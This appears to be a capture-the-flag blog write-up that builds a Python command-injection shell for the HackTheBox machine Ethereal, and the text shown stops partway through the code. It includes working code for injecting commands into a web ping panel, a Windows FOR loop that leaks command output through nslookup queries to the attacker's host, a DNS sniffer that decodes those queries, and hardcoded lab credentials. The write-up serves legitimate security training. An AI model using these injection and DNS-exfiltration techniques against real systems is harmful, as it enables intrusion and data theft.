---
title: HTB: Ethereal Shell Development
url: https://0xdf.gitlab.io/2019/03/09/htb-ethereal-shell.html
date: 2019-03-09T13:46:00+00:00
tags: ctf, hackthebox, htb-ethereal, windows, dns-c2, python, pdb, python-cmd, python-scapy, injection, python-requests
---

![](https://0xdfimages.gitlab.io/img/ethereal-shell-cover.png)It would have been possible to get through the initial enumeration of Ethereal with just Burp Repeater and tcpdump, or using responder to read the DNS requests. But writing a shell is much more fun and good coding practice. I’ll develop around primary two modules from Python, scapy to listen for and process DNS packets, and cmd to create a shell user interface, with requests to make the http injections. In this post I’ll show how I built the shell step by step.

## Overview

There are two main components to this shell:
1. Sending HTTP requests to do a command injection in the Ping Panel on Ethereal.
2. Listening for DNS packets, parsing and processing them, and printing the result to the screen.

I will use threading to run those at the same time from the same Python script.

To build this, I’ll do testing both on Ethereal through injection and from a Windows VM. Both the Windows VM and my Kali VM have interfaces on 10.1.1.0/24, with the Windows at .153, and Kali at .41.

## DNS

### Strategy

The first thing I want to do is capture DNS packets. There are two ways to approach this. The first would be to do what m0noc did in [his video](https://www.youtube.com/watch?v=Egwp5zc5ZIM) and get a copy of a Python DNS server, chop it down to what I need, and add some parsing. The alternative is to use [Scapy](https://scapy.net/) inside Python to listen for the packets I want and parse them. I’m going to go with Scapy here.

### Getting Started

I’m going to start really simple. I just want to show that I can get a DNS packet.

```

  1 #!/usr/bin/env python3
  2 
  3 from scapy.all import *
  4 
  5 def parse_packet(p):
  6     print(p.summary())
  7 
  8 
  9 sniff(iface='eth0', filter="src host 10.1.1.153 and udp port 53", prn=parse_packet)

```

I’ve got a sniffer started listening on “eth0” since I’ll be testing from my local network. I’ll be filtering on the IP of my Windows host and udp port 53. And for each packet, I’ll send it to the function I defined above, `parse_packet`. At this point, that function just prints a summary of the packet.

Here’s the script in action. I’ll run the following from my Windows VM:

```

C:\Users\0xdf\test>nslookup 0xdf.xyz 10.1.1.41
Server:  UnKnown
Address:  10.1.1.41
*** UnKnown can't find 0xdf.xyz: No response from server

```

And I see:

```

root@kali# ./ethereal_shell.py 
Ether / IP / UDP / DNS Qry "b'41.1.1.10.in-addr.arpa.'" 
Ether / IP / UDP / DNS Qry "b'0xdf.xyz.'" 
Ether / IP / UDP / DNS Qry "b'0xdf.xyz.'" 

```

I had `tcpdump` running in a separate terminal window, and it showed the same packets, so I feel confident I’m getting all of them:

```

root@kali# tcpdump -i eth0 udp port 53
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
16:01:34.491316 IP 10.1.1.153.58862 > kali.domain: 1+ PTR? 41.1.1.10.in-addr.arpa. (40)
16:01:34.499460 IP 10.1.1.153.58863 > kali.domain: 2+ A? 0xdf.xyz. (26)
16:01:34.500526 IP 10.1.1.153.58864 > kali.domain: 3+ AAAA? 0xdf.xyz. (26)

```

### Output

I only really want one of these requests, so I’ll select on just getting the A record, which is [qtype == 1](https://www.iana.org/assignments/dns-parameters/dns-parameters.xhtml#dns-parameters-4). I also don’t want to print this summary, but rather the domain name. I’ll update `prase_packet`:

```

  5 def parse_packet(p):
  6     if p.haslayer(DNS) and p.getlayer(DNS).qd.qtype == 1:
  7         print(p.getlayer(DNS).qd.qname.decode('utf-8'))

```

Now when I run this and send the same DNS query:

```

root@kali# ./ethereal_shell.py
0xdf.xyz.

```

### Threading

I want this to run in the background while I’m doing other stuff. So I’m going to make this into a class, and have it subclass Thread. To do this, I’ll need to define a `run` method, which is what will run when the thread is started. I’ll have `run` just start the sniffer. I’ll also move `parse_packet` into the class, so I’ll need to pass it `self` as an argument, and call it by `self.parse_packet` in the `sniff` call.

```

  1 #!/usr/bin/env python3
  2 
  3 from scapy.all import *
  4 from threading import Thread
  5 
  6 
  7 class dns_sniff(Thread):
  8 
  9     def run(self):
 10         sniff(iface='eth0', filter="src host 10.1.1.153 and udp port 53", prn=self.parse_packet)
 11 
 12 
 13     def parse_packet(self, p):
 14         if p.haslayer(DNS) and p.getlayer(DNS).qd.qtype == 1:
 15             print(p.getlayer(DNS).qd.qname.decode('utf-8'))
 16 
 17 dns = dns_sniff()
 18 dns.start()

```

### Additional Flexibility

I’m going to add one more thing to make things more flexible so that I’m not hardcoding the interface and ip in multiple places. To do this, I’ll add an `__init__()` method to the class. Since I was subclassing `Thread`, it’s `__init__()` method was being called when I created a new object. Once I override the `__init__` method, it will no longer automatically call the init from Thread, and that will break things. I’ll fix that with a call to `super().__init()__()`.

```

...
  7 class dns_sniff(Thread):
  8 
  9     def __init__(self, interface='tun0', target_ip='10.10.10.106'):
 10         self.interface = interface
 11         self.target_ip = target_ip
 12         super().__init__(self)
 13 
 14     def run(self):
 15         sniff(iface=self.interface, filter=f"src host {self.target_ip} and udp port 53", prn=self.parse_packet)
 ... 
 22 dns = dns_sniff(interface='eth0', target_ip='10.1.1.153')
 23 dns.start()

```

## Ethereal Ping Panel

### Getting Started

I’m going to make use of the `cmd` python module for this shell. I’ll create a class and define the `default` method, which will process each time the user provides input. I’ll start with a simple implementation that just prints back the command. I’ll also include the `__init__()` function, as I’m going to be using it shortly.

```

  1 #!/usr/bin/env python3
  2 
  3 from cmd import Cmd
  4 from scapy.all import *
  5 from threading import Thread
  6 
  7 
  8 class dns_sniff(Thread):
...
 25 class Terminal(Cmd):
 26     prompt = "ethereal> "
 27 
 28     def __init__(self):
 29         super().__init__()
 30 
 31 
 32     def default(self, args):
 33         print(f"Entered: {args}")
 34 
 35 dns = dns_sniff(interface='eth0', target_ip='10.1.1.153')
 36 dns.start()
 37 
 38 term = Terminal()
 39 term.cmdloop()

```

On running this, it works as expected, both echoing commands and receiving DNS:

```

root@kali# ./ethereal_shell.py
ethereal> test
Entered: test
ethereal> this is a test
Entered: this is a test
ethereal> 0xdf.xyz.             <-- this came from a manual nslookup from my VM

```

Receiving DNS at this point looks awkward because it sits where my input should be. I’ll address that later.

### Interact With Page

Now I need to build in interaction with the Ping Panel. If I go into burp, and look at a POST to the page, I’ll notice a few things:

```

POST / HTTP/1.1
Host: ethereal.htb:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://ethereal.htb:8080/
Content-Type: application/x-www-form-urlencoded
Content-Length: 289
Authorization: Basic YWxhbjohQzQxNG0xN3k1N3IxazNzNGc0MW4h
Connection: close
Upgrade-Insecure-Requests: 1

__VIEWSTATE=%2FwEPDwULLTE0OTYxODU3NjhkZP0D71BrdSC2r6xNMsSvx5TLwDHEW3R5Nu77TRePe554&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=%2FwEdAAOSdp36r9zrz%2Bs0ovq%2FbSa14CgZUgk3s462EToPmqUw3OKvLNdlnDJuHW3p%2B9jPAN8kvJMME1vv%2Bx5EO%2Fp9qTNUHD5bMT5kaL78WVMNT%2BVpZw%3D%3D&search=127.0.0.1&ctl02=

```

I need the http basic auth, and I need to get a handful of parameters for the POST request.

#### Basic Auth

I’ll start with the basic auth. I’ll be using the `requests` module to make HTTP requests, so I’ll follow the guidance from the [documentation](http://docs.python-requests.org/en/master/user/authentication/#basic-authentication) for using basic auth. I’m going to build this initial query in the `__init__` method, as that is where it will eventually end up. To start, I’ll have it fetch the page and print it on init:

```

  1 #!/usr/bin/env python3
  2 
  3 import requests
  4 from cmd import Cmd
  5 from requests.auth import HTTPBasicAuth
  6 from scapy.all import *
  7 from threading import Thread
  8 
  9 
 10 class dns_sniff(Thread):
...
 27 class Terminal(Cmd):
 28     prompt = "ethereal> "
 29     
 30 
 31     def __init__(self):
 32         super().__init__()
 33         auth = HTTPBasicAuth('alan','!C414m17y57r1k3s4g41n!')
 34         resp = requests.get('http://ethereal.htb:8080/', auth=auth)
 35         print(resp.text)
 36 
 37 
 38     def default(self, args):
 39         print(f"Entered: {args}")
 40 
 41 
 42 dns = dns_sniff(interface='eth0', target_ip='10.1.1.153')
 43 dns.start()
 44 
 45 term = Terminal()
 46 term.cmdloop()

```

On running, it works:

```

root@kali# ./ethereal_shell.py

<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Admin Console</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
      <link rel="stylesheet" href="css/style.css">
</head>
<body>
  <div class="body">
        <h1>Test Connection<br/></h1>
       <div class="wrapper">
        <form method="post" action="./" id="ctl01">
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwULLTE0OTYxODU3NjhkZDq+FRgU9epds8vdzQCOhWx4WFqAM2hNIbgH2RI3jXSz" />
<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="CA0B0334" />
<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAAOFr9TrHWt+2bA4FwNr3j1Y4CgZUgk3s462EToPmqUw3OKvLNdlnDJuHW3p+9jPAN9kKYZ9rDh9NVw3pnVFLEyhi/zP9ndEQ4bcuvdL5zBCfg==" />
            <input name="search" id="search" class="search" type="text" />
            <input type="submit" name="ctl02" value="" class="submit" type="submit" value=" " />
        </form>
        </div>
</div>
<h2 id="l1"><font face="Verdana">Click to test connection</font></h2>
  <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
    <script  src="js/index.js"></script>
</body>

</html>

ethereal>

```

#### Get Params

Now that I can fetch the page, I need to get the parameters to submit. I submitted a handful of legitimate ips to the panel manually, and checked in burp, and the various hidden parameters did not change over a short period of time. That means I can save them in the `__init__()` call, and then use them on repeated POSTs.

I’ll use [BeautifulSoup](https://www.crummy.com/software/BeautifulSoup/) to parse the page. I can install with `python3 -m pip install bs4`. To figure out what exactly I want to collect, I’ll use the Python Debugger, `pdb`. I’ll add `from bs4 import BeautifulSoup` to my imports (bumping all the line numbers from above up one), and then call the script with a breakpoint at `print(resp.text)` (now line 36). I can pass commands into pdb from the command line with the `-c` switch, so I’ll have my first `-c` set my break point and a second tell it to run on start to that break point:

```

root@kali# python3 -mpdb -c "b 36" -c c ./ethereal_shell.py 
Breakpoint 1 at /media/sf_CTFs/hackthebox/ethereal-10.10.10.106/ethereal_shell.py:36
> /media/sf_CTFs/hackthebox/ethereal-10.10.10.106/ethereal_shell.py(36)__init__()
-> print(resp.text)
(Pdb) 

```

Now I can parse the page in BS, and then search it:

```

(Pdb) soup = BeautifulSoup(resp.text, 'html.parser')

```

Now I can search and find the fields I’m looking for. I’ll start by looking at all `inputs`:

```

(Pdb) soup.find_all('input')
[<input id="__VIEWSTATE" name="__VIEWSTATE" type="hidden" value="/wEPDwULLTE0OTYxODU3NjhkZDq+FRgU9epds8vdzQCOhWx4WFqAM2hNIbgH2RI3jXSz"/>, <input id="__VIEWSTATEGENERATOR" name="__VIEWSTATEGENERATOR" type="hidden" value="CA0B0334"/>, <input id="__EVENTVALIDATION" name="__EVENTVALIDATION" type="hidden" value="/wEdAAOFr9TrHWt+2bA4FwNr3j1Y4CgZUgk3s462EToPmqUw3OKvLNdlnDJuHW3p+9jPAN9kKYZ9rDh9NVw3pnVFLEyhi/zP9ndEQ4bcuvdL5zBCfg=="/>, <input class="search" id="search" name="search" type="text"/>, <input class="submit" name="ctl02" type="submit" value=" "/>]

```

I can actually use the `find` function to get an `input` with an `id`:

```

(Pdb) soup.find("input", id="__VIEWSTATE")
<input id="__VIEWSTATE" name="__VIEWSTATE" type="hidden" value="/wEPDwULLTE0OTYxODU3NjhkZDq+FRgU9epds8vdzQCOhWx4WFqAM2hNIbgH2RI3jXSz"/>

```

Now I want to get the value from that:

```

(Pdb) soup.find("input", id="__VIEWSTATE").get('value')
'/wEPDwULLTE0OTYxODU3NjhkZDq+FRgU9epds8vdzQCOhWx4WFqAM2hNIbgH2RI3jXSz'

```

I can also get the other parameters:

```

(Pdb) soup.find("input", id="__VIEWSTATEGENERATOR").get('value')
'CA0B0334'
(Pdb) soup.find("input", id="__EVENTVALIDATION").get('value')
'/wEdAAOFr9TrHWt+2bA4FwNr3j1Y4CgZUgk3s462EToPmqUw3OKvLNdlnDJuHW3p+9jPAN9kKYZ9rDh9NVw3pnVFLEyhi/zP9ndEQ4bcuvdL5zBCfg=='

```

Now that I know how to get the values, I’ll add that to my `__init__()` (and remove printing the response):

```

 32     def __init__(self):
 33         super().__init__()
 34         auth = HTTPBasicAuth('alan','!C414m17y57r1k3s4g41n!')
 35         resp = requests.get('http://ethereal.htb:8080/', auth=auth)
 36         soup = BeautifulSoup(resp.text, 'html.parser')
 37         self.view_state = soup.find("input", id="__VIEWSTATE").get('value')
 38         self.view_state_gen = soup.find("input", id="__VIEWSTATEGENERATOR").get('value')
 39         self.event_val = soup.find("input", id="__EVENTVALIDATION").get('value')

```

### Send POST

#### Add Proxy

I want to be able to send requests through a proxy. I’ll I define that when I create the terminal by adding it as a parameter of `__init__`. I’ll have the default be no proxy, but for now I’ll create the terminal with Burp as my proxy:

```

 32     def __init__(self, proxy=None):
 33         super().__init__()
 34         self.proxy = proxy or {}
 35         self.auth = HTTPBasicAuth('alan','!C414m17y57r1k3s4g41n!')
 36         resp = requests.get('http://ethereal.htb:8080/', auth=self.auth, proxies=self.proxy)
 ...
 46 term = Terminal(proxy={"http": "http://127.0.0.1:8080"})
 47 term.cmdloop()

```

#### POST Function

Now I want to send a post to the page. I’ll create a function to do that, as I may use this in multiple commands inside my terminal. The POST sends five parameters, three of which I’ve already collected at initiation, and one of which is empty:

```

__VIEWSTATE=%2FwEPDwULLTE0OTYxODU3NjhkZDq%2BFRgU9epds8vdzQCOhWx4WFqAM2hNIbgH2RI3jXSz&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=%2FwEdAAOFr9TrHWt%2B2bA4FwNr3j1Y4CgZUgk3s462EToPmqUw3OKvLNdlnDJuHW3p%2B9jPAN9kKYZ9rDh9NVw3pnVFLEyhi%2FzP9ndEQ4bcuvdL5zBCfg%3D%3D&search=127.0.0.1&ctl02=

```

I just need to pass in a `search` parameter.

```

 43     def send_post(self, search):
 44         data = {'__VIEWSTATE': self.view_state,
 45                 '__VIEWSTATEGENERATOR': self.view_state_gen,
 46                 '__EVENTVALIDATION': self.event_val,
 47                 'search': search,
 48                 'ctl02': ''}
 49         resp = requests.post('http://ethereal.htb:8080/',
 50                              proxies=self.proxy,
 51                              data = data,
 52                              auth = self.auth)

```

I can test this by adding this to the default command:

```

 55     def default(self, args):
 56         print(f"Entered: {args}")
 57         self.send_post(search='127.0.0.1')

```

I’ll enter any command, and then check burp to make sure that the request worked, and that I see `Connection to host successful` in the response.

## Command Output to nslookup

### Command For Loops

In Ethereal, I was able to get `nslookup` to query me for a domain I gave it. Now I want to run a command and have the output encoded as a domain that can be queried. To do that, I’ll need to understand how `for` loops work in cmd, specifically with `/F`, which is used to loop over results of commands ([this is a good reference](https://ss64.com/nt/for_cmd.html)).

It will take the form:

```

FOR /F ["options"] %%parameter IN ('command_to_process') DO command

```

I’m going to define the tokens as 1-26, and then let the parameter be `%a` so I can use lowercase letters to represent the values.

I’ll start with some examples on a Windows VM. I’ll run a simple `dir` in an empty directory:

```

C:\Users\0xdf\test>dir
 Volume in drive C has no label.
 Volume Serial Number is F06E-7663

 Directory of C:\Users\0xdf\test

02/25/2019  07:04 AM    <DIR>          .
02/25/2019  07:04 AM    <DIR>          ..
               0 File(s)              0 bytes
               2 Dir(s)   4,890,824,704 bytes free

```

Since the default delimiter is space, here’s how the loop will see this same output as tokens:

![1551107748691](https://0xdfimages.gitlab.io/img/1551107748691.png)

You can see this if I run it through a loop. Here’s the specifics:
- `for /f` - Loop over command output
- `"tokens=1-26"` - Get up to 26 tokens
- `%a` - Defines the tokens as `%[lowercase]`, where `%a` is explicitly declared, and the rest are implicitly declared
- `in ('dir')` - The command to run
- `echo %a` - What to do with the resulting tokens
- `@echo off` and `@echo on` - Prevent a bunch of noise from printing

```

C:\Users\0xdf\test>@echo off & (for /f "tokens=1-26" %a in ('dir') DO echo %a) & @echo on
Volume
Volume
Directory
02/25/2019
02/25/2019
0
2

```

That output matches nicely with the red box in the image above. I can get `%c` to get the pink:

```

C:\Users\0xdf\test>@echo off & (for /f "tokens=1-26" %a in ('dir') DO echo %c) & @echo on
drive
Number
C:\Users\0xdf\test
AM
AM
0
4,917,178,368

```

I can also combine tokes as I see fit (a silly example):

```

C:\Users\0xdf\test>@echo off & (for /f "tokens=1-26" %a in ('dir') DO echo %c-%b___%a) & @echo on
drive-in___Volume
Number-Serial___Volume
C:\Users\0xdf\test-of___Directory
AM-07:04___02/25/2019
AM-07:04___02/25/2019
0-File(s)___0
4,917,182,464-Dir(s)___2

```

### nslookup Basics

Now I’ll use what I know about looping to generate `nsloopup` commands. If I start with this loop:

```

C:\Users\0xdf\test> for /f "tokens=1-26" %a in ('dir') DO (nslookup %a.%b.%c. 10.1.1.41)

```

Here’s what I see in `tcpdump`:

```

root@kali# tcpdump -ni eth0 udp port 53
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
11:35:55.294278 IP 10.1.1.153.56258 > 10.1.1.41.53: 1+ PTR? 41.1.1.10.in-addr.arpa. (40)
11:35:55.296505 IP 10.1.1.153.56259 > 10.1.1.41.53: 2+ A? Volume.in.drive. (33)
11:35:55.296723 IP 10.1.1.153.56260 > 10.1.1.41.53: 3+ AAAA? Volume.in.drive. (33)
11:35:55.318089 IP 10.1.1.153.56261 > 10.1.1.41.53: 1+ PTR? 41.1.1.10.in-addr.arpa. (40)
11:35:55.319970 IP 10.1.1.153.56262 > 10.1.1.41.53: 2+ A? Volume.Serial.Number. (38)
11:35:55.320227 IP 10.1.1.153.56263 > 10.1.1.41.53: 3+ AAAA? Volume.Serial.Number. (38)
11:35:55.339339 IP 10.1.1.153.56264 > 10.1.1.41.53: 1+ PTR? 41.1.1.10.in-addr.arpa. (40)
11:35:57.338883 IP 10.1.1.153.56265 > 10.1.1.41.53: 2+ A? Directory.of.C:Users0xdftest. (46)
11:35:57.339221 IP 10.1.1.153.56266 > 10.1.1.41.53: 3+ AAAA? Directory.of.C:Users0xdftest. (46)
11:35:57.364436 IP 10.1.1.153.56267 > 10.1.1.41.53: 1+ PTR? 41.1.1.10.in-addr.arpa. (40)
11:35:59.364047 IP 10.1.1.153.56268 > 10.1.1.41.53: 2+ A? 02/25/2019.07:04.AM. (37)
11:35:59.365326 IP 10.1.1.153.56269 > 10.1.1.41.53: 3+ AAAA? 02/25/2019.07:04.AM. (37)
11:35:59.423620 IP 10.1.1.153.56270 > 10.1.1.41.53: 1+ PTR? 41.1.1.10.in-addr.arpa. (40)
11:36:01.426274 IP 10.1.1.153.56271 > 10.1.1.41.53: 2+ A? 02/25/2019.07:04.AM. (37)
11:36:01.427472 IP 10.1.1.153.56272 > 10.1.1.41.53: 3+ AAAA? 02/25/2019.07:04.AM. (37)
11:36:01.476957 IP 10.1.1.153.56273 > 10.1.1.41.53: 1+ PTR? 41.1.1.10.in-addr.arpa. (40)
11:36:03.487602 IP 10.1.1.153.56274 > 10.1.1.41.53: 2+ A? 0.File(s).0. (29)
11:36:03.489038 IP 10.1.1.153.56275 > 10.1.1.41.53: 3+ AAAA? 0.File(s).0. (29)
11:36:03.537786 IP 10.1.1.153.56276 > 10.1.1.41.53: 1+ PTR? 41.1.1.10.in-addr.arpa. (40)
11:36:05.527818 IP 10.1.1.153.56277 > 10.1.1.41.53: 2+ A? 2.Dir(s).4,917,108,736. (40)
11:36:05.528172 IP 10.1.1.153.56278 > 10.1.1.41.53: 3+ AAAA? 2.Dir(s).4,917,108,736. (40)

```

If I grep out just the A records:

```

11:35:55.296505 IP 10.1.1.153.56259 > 10.1.1.41.53: 2+ A? Volume.in.drive. (33)
11:35:55.319970 IP 10.1.1.153.56262 > 10.1.1.41.53: 2+ A? Volume.Serial.Number. (38)
11:35:57.338883 IP 10.1.1.153.56265 > 10.1.1.41.53: 2+ A? Directory.of.C:Users0xdftest. (46)
11:35:59.364047 IP 10.1.1.153.56268 > 10.1.1.41.53: 2+ A? 02/25/2019.07:04.AM. (37)
11:36:01.426274 IP 10.1.1.153.56271 > 10.1.1.41.53: 2+ A? 02/25/2019.07:04.AM. (37)
11:36:03.487602 IP 10.1.1.153.56274 > 10.1.1.41.53: 2+ A? 0.File(s).0. (29)
11:36:05.527818 IP 10.1.1.153.56277 > 10.1.1.41.53: 2+ A? 2.Dir(s).4,917,108,736. (40)

```

So I’m getting the start of the dir list.

### nslookup Command Output

Now I’ll send full command output over dns. I’ll comment out the terminal lines at the end of `ethereal_shell.py` that that I’m just running the dns part, and run it.

Now I’ll try to get the output of a dir command. I’ll use the full 26 tokens, and run something like this: `FOR /F "tokens=1-26" %a IN ('dir /x .') DO ( nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i.%j.%k.%l.%m.%n.%o.%p.%q.%r.%s.%t.%u.%v.%w.%x.%y.%z 10.1.1.41`. The idea is to do a `dir` (with `/x` to get long and short file names), and for each line, break it on whitespace, and send it out with each word being a subdomain in the dns lookup. But this fails (errors on Windows VM and nothing on Kali listener):

```

C:\Users\0xdf\test>@echo off & (FOR /F "tokens=1-26" %a IN ('dir /x .') DO ( nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i.%j.%k.%l.%m.%n.%o.%p.%q.%r.%s.%t.%u.%v.%w.%x.%y.%z 10.1.1.41)) & @echo on
Server:  UnKnown
Address:  10.1.1.41
*** UnKnown can't find Volume.in.drive.C.has.no.label....................: Unspecified error
Server:  UnKnown
Address:  10.1.1.41
*** UnKnown can't find Volume.Serial.Number.is.F06E-7663.....................: Unspecified error
Server:  UnKnown
Address:  10.1.1.41
*** UnKnown can't find Directory.of.C:\Users\0xdf\test.......................: Unspecified error
Server:  UnKnown
Address:  10.1.1.41
*** UnKnown can't find 02/25/2019.07:04.AM.<DIR>.......................: Unspecified error
Server:  UnKnown
Address:  10.1.1.41
*** UnKnown can't find 02/25/2019.07:04.AM.<DIR>........................: Unspecified error
Server:  UnKnown
Address:  10.1.1.41
*** UnKnown can't find 0.File(s).0.bytes......................: Unspecified error
DNS request timed out.
    timeout was 2 seconds.
Server:  UnKnown
Address:  10.1.1.41
*** UnKnown can't find 2.Dir(s).4,913,123,328.bytes.free.....................: Unspecified error

```

The reason it fails is because you can’t have two `.` in a row in a valid domain name. I’ll fix that by including a single character in before each token. That way, an empty token will still produce that character, and I can just remove it on the receiving end.

In the real thing, I’ll use the same character for each token, but for demonstration, I’ll show this one with each token having a different character. I’ll show the dir, and then the output from running the loop over it:

```

C:\Users\0xdf\test>dir /x
 Volume in drive C has no label.
 Volume Serial Number is F06E-7663

 Directory of C:\Users\0xdf\test

02/25/2019  07:04 AM    <DIR>                       .
02/25/2019  07:04 AM    <DIR>                       ..
               0 File(s)              0 bytes
               2 Dir(s)   4,913,123,328 bytes free

C:\Users\0xdf\test>@echo off & (FOR /F "tokens=1-26" %a IN ('dir /x .') DO ( nsl
ookup "A%a.B%b.C%c.D%d.E%e.F%f.G%g.H%h.I%i.J%j.K%k.L%l.M%m.N%n.O%o.P%p.Q%q.R%r.S
%s.T%t.U%u.V%v.W%w.X%x.Y%y.Z%z" 10.1.1.41)) & @echo on
Server:  UnKnown
Address:  10.1.1.41
*** UnKnown can't find AVolume.Bin.Cdrive.DC.Ehas.Fno.Glabel..H.I.J.K.L.M.N.O.P.
Q.R.S.T.U.V.W.X.Y.Z: Unspecified error
Server:  UnKnown
Address:  10.1.1.41
*** UnKnown can't find AVolume.BSerial.CNumber.Dis.EF06E-7663.F.G.H.I.J.K.L.M.N.
O.P.Q.R.S.T.U.V.W.X.Y.Z: No response from server
Server:  UnKnown
Address:  10.1.1.41

DNS request timed out.
    timeout was 2 seconds.
*** UnKnown can't find ADirectory.Bof.CC:\Users\0xdf\test.D.E.F.G.H.I.J.K.L.M.N.
O.P.Q.R.S.T.U.V.W.X.Y.Z: No response from server
Server:  UnKnown
Address:  10.1.1.41
*** UnKnown can't find A02/25/2019.B07:04.CAM.D<DIR>.E..F.G.H.I.J.K.L.M.N.O.P.Q.
R.S.T.U.V.W.X.Y.Z: Unspecified error
Server:  UnKnown
Address:  10.1.1.41
*** UnKnown can't find A02/25/2019.B07:04.CAM.D<DIR>.E...F.G.H.I.J.K.L.M.N.O.P.Q
.R.S.T.U.V.W.X.Y.Z: Unspecified error
DNS request timed out.
    timeout was 2 seconds.
Server:  UnKnown
Address:  10.1.1.41
*** UnKnown can't find A0.BFile(s).C0.Dbytes.E.F.G.H.I.J.K.L.M.N.O.P.Q.R.S.T.U.V
.W.X.Y.Z: No response from server
DNS request timed out.
    timeout was 2 seconds.
Server:  UnKnown
Address:  10.1.1.41
*** UnKnown can't find A2.BDir(s).C4,913,123,328.Dbytes.Efree.F.G.H.I.J.K.L.M.N.
O.P.Q.R.S.T.U.V.W.X.Y.Z: No response from server

```

Here’s what I received at my shell:

```

root@kali# ./ethereal_shell.py 
AVolume.BSerial.CNumber.Dis.EF06E-7663.F.G.H.I.J.K.L.M.N.O.P.Q.R.S.T.U.V.W.X.Y.Z.
ADirectory.Bof.CC:Users0xdftest.D.E.F.G.H.I.J.K.L.M.N.O.P.Q.R.S.T.U.V.W.X.Y.Z.
A0.BFile(s).C0.Dbytes.E.F.G.H.I.J.K.L.M.N.O.P.Q.R.S.T.U.V.W.X.Y.Z.
A2.BDir(s).C4,913,123,328.Dbytes.Efree.F.G.H.I.J.K.L.M.N.O.P.Q.R.S.T.U.V.W.X.Y.Z.

```

There were seven lines in the dir, but only four reached me. I’ll look closer at one of the lines that had an error:

```

Server:  UnKnown
Address:  10.1.1.41
*** UnKnown can't find A02/25/2019.B07:04.CAM.D<DIR>.E..F.G.H.I.J.K.L.M.N.O.P.Q.
R.S.T.U.V.W.X.Y.Z: Unspecified error

```

That would have been this line:

```

02/25/2019  07:04 AM    <DIR>                       .

```

So the token that ended with a `.` led to two in a row, and therefore an invalid domain. That happened three times.

I can make this somewhat better by putting a letter before and after the token:

```

(FOR /F "tokens=1-26" %a IN ('dir /x') DO ( nsloo
kup "Q%aX.Q%bX.Q%cX.Q%dX.Q%eX.Q%fX.Q%gX.Q%hX.Q%iX.Q%jX.Q%kX.Q%lX.Q%mX.Q%nX.Q%oX.
Q%pX.Q%qX.Q%rX.Q%sX.Q%tX.Q%uX.Q%vX.Q%wX.Q%xX.Q%yX.Q%zX" 10.1.1.41))

```

That gives 6 of the 7 lines (`..` still breaks things):

```

QVolumeX.QinX.QdriveX.QCX.QhasX.QnoX.Qlabel.X.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.
QVolumeX.QSerialX.QNumberX.QisX.QF06E-7663X.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.
QDirectoryX.QofX.QC:Users0xdftestX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.
Q02/25/2019X.Q07:04X.QAMX.Q<DIR>X.Q.X.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.
Q0X.QFile(s)X.Q0X.QbytesX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.
Q2X.QDir(s)X.Q4,912,214,016X.QbytesX.QfreeX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.

```

### Updating DNS Parse

Looking at the output above, I’ll notice that each field is broken by `X.Q`. So, to get this back to what I’m looking for, I’ll update the `parse_packet` function to replace `X.Q` with space. I’ll also drop the leading character (`Q`) and the trailing two (`X.`):

```

 23     def parse_packet(self, p):
 24         if p.haslayer(DNS) and p.getlayer(DNS).qd.qtype == 1:
 25             domain = p.getlayer(DNS).qd.qname.decode('utf-8')
 26             print(domain[1:-2].replace('X.Q',' ').strip())

```

Now I can run commands from the VM and see results. I’ll show a couple examples with the output of the command on the VM, followed by what I get through DNS with the script.

`whoami`:

```

C:\Users\0xdf\test>whoami
sevener\0xdf

```

```

sevener0xdf

```

`whoami /priv`:

```

C:\Users\0xdf\test>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

```

```

PRIVILEGES INFORMATION
----------------------
Privilege Name Description State
============================= ==================================== ========
SeShutdownPrivilege Shut down the system Disabled
SeChangeNotifyPrivilege Bypass traverse checking Enabled
SeUndockPrivilege Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
SeTimeZonePrivilege Change the time zone Disabled
SeTimeZonePrivilege Change the time zone Disabled

```

I lose spacing, `/`, and any line with `..` in it. But other than that, it’s pretty solid.

### Updating Command Sending

Now I just need to update `default()` to generate the command string and send it. I’ll need to start with a `&` to add another command, then put my loop:

```

 55     def default(self, args):
